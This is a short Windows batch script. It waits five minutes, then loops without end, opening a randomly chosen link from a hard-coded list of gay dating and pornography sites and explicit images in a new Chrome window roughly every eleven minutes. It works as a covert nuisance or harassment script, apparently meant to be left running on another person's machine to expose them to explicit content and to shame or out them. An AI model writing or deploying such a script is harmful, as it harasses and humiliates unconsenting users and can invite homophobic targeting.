@echo off
set list[1]="http://bluesystem.org/psychology/"
set list[2]="http://big-banan.ru/index.php/razmestit-anketu"
set list[3]="http://eburgay.ru/love/"
set list[4]="http://www.gay.ru/dating/"
set list[5]="http://www.1gay.ru/"
set list[6]="http://eburgay.ru/index.php?"
set list[7]="http://www.mirorgazma.ru/cat25514p1/"
set list[7]="https://prostoporno.club/categories/gay-porno/"
set list[8]="http://www.xvideos.com/gay"
set list[9]="http://lentaporno.online/gay-porno/"
set list[10]="http://homegay.net/rusgay"
set list[11]="http://www.icegaytube.tv/ru/"
set list[12]="https://img07.rl0.ru/6415b7a3e949b9d9f9409a0c68e83702/c1280x853/cdn.imgs.gayfuckbuddies.com/224/43168/1eea1d59b28bfa05804fae8f29817a20/01.jpg"
set list[13]="http://www.edengay.com/gallery/2013/02/david-ken-justin-harris/david-ken-justin-harris-11.jpg"
set list[14]="http://pleshka.com/images/00/fs767500.jpg"
timeout 300
:top
setlocal EnableDelayedExpansion
set /a num=%random% %%14 + 1
start chrome !list[%num%]! --new-window
timeout 650
goto top